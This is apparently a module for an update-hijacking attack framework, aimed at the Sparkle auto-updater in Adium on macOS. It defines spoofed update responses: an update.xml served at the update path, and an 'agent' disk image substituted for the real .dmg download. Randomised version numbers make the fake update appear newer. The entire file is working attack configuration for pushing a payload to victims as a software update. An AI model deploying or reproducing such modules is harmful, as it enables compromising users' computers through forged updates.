from modules import ModuleBase


class Sparkle(ModuleBase):
    name = 'Sparkle'
    version = '1.0'
    appver = '<= 1.5 (<=1.3.10 Adium)'
    author = ['Federico Kirschbaum < fedek +[AT]+ infobytesec.com>']
    description = ''
    vh = '(adium.im)' 
    agent_filename = './agent/osx/update.dmg'
    requests = [
        {   'path': '/sparkle/update.php',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/sparkle/update.xml',
        },
        {   'path': '.dmg',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
